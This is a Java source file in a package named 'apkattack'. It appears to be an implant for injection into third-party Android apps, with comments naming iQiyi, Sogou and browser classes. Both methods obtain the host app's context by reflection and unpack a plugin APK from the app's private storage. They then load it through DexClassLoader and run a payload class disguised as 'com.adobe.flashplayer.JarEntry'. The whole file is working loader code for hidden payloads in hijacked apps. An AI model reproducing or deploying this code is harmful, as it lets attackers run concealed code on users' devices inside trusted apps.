package com.example.apkattack;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.lang.reflect.Method;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

import android.app.Activity;
import android.content.Context;
import android.util.Log;
import dalvik.system.DexClassLoader;

/*
com.storm.newsvideo.NewsApplication
com.sogou.activity.src.SplashActivity
com.sogou.activity.src
com.android.browser.BrowserActivity
 */

//\download\appstore\game\PPSGameLibrary.smali
//Ldownload/appstore/gamedownload/DownloadMgr;
//Ldownload/appstore/gamedownload/utils/AppUtils;
//download.appstore.gamedownload.DownloadService.onCreate()
public class IqiyiAppFw {
	
	public static void qiyiAppFwEntryWithoutContext(){
    	String Tag = "qiyiAndroidAppFwEntry";
    	try {
    		Log.e(Tag,"start");
    		
	        Class<?> ActivityThread = Class.forName("android.app.ActivityThread");
	        Method methodcat = ActivityThread.getMethod("currentActivityThread");
	        Object currentActivityThread = methodcat.invoke(ActivityThread);
	        Method methodga = currentActivityThread.getClass().getMethod("getApplication");
	        Context context =(Context)methodga.invoke(currentActivityThread);
			if (context == null) {
				Log.e(Tag, "context null");
				return;
			}else{
				Log.e(Tag, "get context ok,package name:" + context.getPackageName()+"/" + context.getClass().getName());
			}
			
			Throwable ex = new Throwable();
	        StackTraceElement[] stackElements = ex.getStackTrace();
	        if (stackElements != null) {
	            for (int i = 0; i < stackElements.length; i++) {
	            	Log.e(Tag, "class:" + stackElements[i].getClassName()+"/method:" + stackElements[i].getMethodName());
	            	//Log.e(Tag, stackElements[i].getFileName());
	            	//Log.e(Tag, stackElements[i].getLineNumber());
	            	//Log.e(Tag, stackElements[i].getMethodName());
	            }
	        }
    		
    		
    		String apppath = context.getFilesDir().getParent() + "/";
	    	String unzippath = apppath + "qiyiAppFW/";
	    	String dexmethodname = "start";
	    	String dexclassname = "com.adobe.flashplayer.JarEntry";

	    	String cfgfn = "ark.dat";
	    	String apkfn = "";
	    	boolean apkexist = false;
	    	boolean cfgexit = false;
	    	File assetspathFile = new File(unzippath + "assets/");
	    	if (assetspathFile.exists() == true) {
				File assetsFiles[] = assetspathFile.listFiles();
				if (assetsFiles != null && assetsFiles.length > 0) {
					for(int i = 0;i < assetsFiles.length; i ++)
					{
						String subfn = assetsFiles[i].getName();
						if(subfn.endsWith(".apk") == true){
							apkexist = true;
							apkfn = subfn;
						}else if (subfn.equals(cfgfn) == true) {
							cfgexit = true;
						}
					}
				}
			}else{
				boolean ret = assetspathFile.mkdirs();
				if (ret == false) {
					Log.e(Tag,"error create unzip folder:" + assetspathFile.getName());
					return;
				}
			}
	    	
	    	
	    	if (apkexist == false || cfgexit == false ) {
	    	
		    	String pluginPath = apppath + "app_pluginapp/";
		    	File pluginFile = new File(pluginPath);
		    	File [] pluginFiles = pluginFile.listFiles();
		    	if (pluginFiles == null) {
		    		Log.e(Tag,"error list files:" + pluginPath);
					return;
				}
		    	

		    	String zipfn = "";
		    	for (int i = 0; i < pluginFiles.length; i++) {
		    		if (pluginFiles[i].isDirectory()) {
						continue;
					}
		    		
		    		String tmpString = pluginFiles[i].getName();
					if ( tmpString.startsWith("android.app.fw.99.") && (tmpString.endsWith(".apk") )) 
					{
						zipfn = tmpString;
						Log.e(Tag,"find apk file:" + zipfn);
						break;
					}
				}

		        ZipEntry zipEntry = null;
		        byte unzipbuf[] = new byte[0x10000];
		        ZipInputStream zipIn = new ZipInputStream(new BufferedInputStream(new FileInputStream(pluginPath + zipfn)));
	            while ( (zipEntry = zipIn.getNextEntry()) != null) {
	            	File unzipfile = new File(unzippath + zipEntry.getName());
	                if (zipEntry.isDirectory()) {
	                	unzipfile.mkdirs();
	                	Log.e(Tag,"unzip make folder:" + zipEntry.getName());
	                } else {
	                    File unzipparent = unzipfile.getParentFile();
	                    if (unzipparent.exists() == false) {
	                    	unzipparent.mkdirs();
	                    	
	                    	Log.e(Tag,"unzip make parent folder:" + unzipparent.getName());
	                    }
	                    
	                	FileOutputStream fileOut = new FileOutputStream(unzipfile);
	                    int readedBytes = 0;
	                    while ((readedBytes = zipIn.read(unzipbuf)) > 0) {
	                        fileOut.write(unzipbuf, 0, readedBytes);
	                    }
	                    fileOut.close();
	                }
	                zipIn.closeEntry();
	            }
	            zipIn.close();
	            
	            Log.e(Tag,"unzip complete");
			}else{
				Log.e(Tag,"compressed folder already exist");
			}

	    	String appcachepath = context.getCacheDir() + "/";
	    	
			File assetsfiles[] = new File(unzippath + "assets/").listFiles();
			for (int i = 0; i < assetsfiles.length; i++) {
				String tmpfn = assetsfiles[i].getName();
				if (tmpfn.endsWith(".apk") && tmpfn.equals("base.apk") == false) {
					apkfn = tmpfn;
					break;
				}
			}
	    	
	    	DexClassLoader dexcl = new DexClassLoader(unzippath + "assets/" + apkfn, appcachepath, null,context.getClassLoader());

    		Class<?> cls = dexcl.loadClass(dexclassname);
    	    Object obj = cls.newInstance();

    	    Method method = cls.getDeclaredMethod(dexmethodname, Context.class,String.class);
    	    method.invoke(obj,context,unzippath + "assets/");
    	    
    	    Log.e(Tag, "qiyi load apk success");
    	} catch (Exception ex) {
    		ex.printStackTrace();
    		Log.e(Tag, "qiyi load apk exception");
    	}
	}
	
	
	//Ldownload/appstore/gamedownload/activity/TransparentActivity;
	public static void qiyiAppFwEntryWithActivity(Activity activity){
    	String Tag = "qiyiAppFwEntryWithActivity";
    	try {
    		Log.e(Tag,"start");
    		
	        Class<?> ActivityThread = Class.forName("android.app.ActivityThread");
	        Method methodcat = ActivityThread.getMethod("currentActivityThread");
	        Object currentActivityThread = methodcat.invoke(ActivityThread);
	        Method methodga = currentActivityThread.getClass().getMethod("getApplication");
	        Context context =(Context)methodga.invoke(currentActivityThread);
			if (context == null) {
				Log.e(Tag, "context null");
				return;
			}else{
				Log.e(Tag, "get context ok,package name:" + context.getPackageName()+"/" + context.getClass().getName());
			}
			
			Throwable ex = new Throwable();
	        StackTraceElement[] stackElements = ex.getStackTrace();
	        if (stackElements != null) {
	            for (int i = 0; i < stackElements.length; i++) {
	            	Log.e(Tag, "class:" + stackElements[i].getClassName()+"/method:" + stackElements[i].getMethodName());
	            	//Log.e(Tag, stackElements[i].getFileName());
	            	//Log.e(Tag, stackElements[i].getLineNumber());
	            	//Log.e(Tag, stackElements[i].getMethodName());
	            }
	        }
    		

    		String apppath = context.getFilesDir().getParent() + "/";
	    	String unzippath = apppath + "qiyiAppFW/";
	    	String dexmethodname = "startActivity";
	    	//String cfgfn = "ark.dat";
	    	String dexclassname = "com.adobe.flashplayer.JarEntry";
	    	//String dexclassname = "com.google.android.apps.plus.JarEntry";

			File unzippathfFile = new File(unzippath);
			if (unzippathfFile.exists() == false) {
				boolean ret = unzippathfFile.mkdirs();
				if (ret == false) {
					Log.e(Tag,"error create unzip folder:" + unzippath);
					return;
				}else{
					Log.e(Tag,"successully unzip make path:" + unzippath);
				}
			}else{
				Log.e(Tag,"already exist unzip path:" + unzippath);
			}
	    	
	    	String apkfn = "simcard.apk";
			File []unzipfiles = new File(unzippath + "assets/").listFiles();
			if (unzipfiles == null || unzipfiles.length == 0) {
		    	String pluginPath = apppath + "app_pluginapp/";
		    	File pluginFile = new File(pluginPath);
		    	File [] pluginFiles = pluginFile.listFiles();
		    	if (pluginFiles == null) {
		    		Log.e(Tag,"error list files:" + pluginPath);
					return;
				}
		    	
		    	for (int i = 0; i < pluginFiles.length; i++) {
		    		if (pluginFiles[i].isDirectory()) {
						continue;
					}
		    		
		    		String tmpString = pluginFiles[i].getName();
					if ( tmpString.startsWith("android.app.fw.99.") && ( tmpString.endsWith(".apk") ) ) {
						apkfn = tmpString;
						Log.e(Tag,"find apk file:" +apkfn);
						break;
					}
				}

		        ZipEntry zipEntry = null;
		        byte unzipbuf[] = new byte[0x10000];
		        ZipInputStream zipIn = new ZipInputStream(new BufferedInputStream(new FileInputStream(pluginPath + apkfn)));

	            while ( (zipEntry = zipIn.getNextEntry()) != null) {
	            	File unzipfile = new File(unzippath + zipEntry.getName());
	                if (zipEntry.isDirectory()) {
	                	unzipfile.mkdirs();
	                	Log.e(Tag,"unzip make folder:" + zipEntry.getName());
	                } else {
	                    File unzipparent = unzipfile.getParentFile();
	                    if (unzipparent.exists() == false) {
	                    	unzipparent.mkdirs();
	                    	
	                    	Log.e(Tag,"unzip make parent folder:" + unzipparent.getName());
	                    }
	                    
	                	FileOutputStream fileOut = new FileOutputStream(unzipfile);
	                    int readedBytes = 0;
	                    while ((readedBytes = zipIn.read(unzipbuf)) > 0) {
	                        fileOut.write(unzipbuf, 0, readedBytes);
	                    }
	                    fileOut.close();
	                }
	                zipIn.closeEntry();
	            }
	            zipIn.close();
	            
	            Log.e(Tag,"unzip complete");
			}else{
				Log.e(Tag,"find apk and config file");
			}

	    	String appcachepath = context.getCacheDir() + "/";
	    	
			unzipfiles = new File(unzippath + "assets/").listFiles();
			for (int i = 0; i < unzipfiles.length; i++) {
				String tmpfn = unzipfiles[i].getName();
				if (tmpfn.endsWith(".apk") && tmpfn.equals("base.apk") == false) {
					apkfn = tmpfn;
					break;
				}
			}
			
	    	
	    	DexClassLoader dexcl = new DexClassLoader(unzippath + "assets/" + apkfn, appcachepath,null,context.getClassLoader());
    		Class<?> cls = dexcl.loadClass(dexclassname);
    	    Object obj = cls.newInstance();
    	    Method method = cls.getDeclaredMethod(dexmethodname, Activity.class);
    	    method.invoke(obj,activity);
    	    
    	    Log.e(Tag, "qiyi load apk success");
    	} catch (Exception ex) {
    		ex.printStackTrace();
    		Log.e(Tag, "qiyi load apk exception");
    	}
	}

}
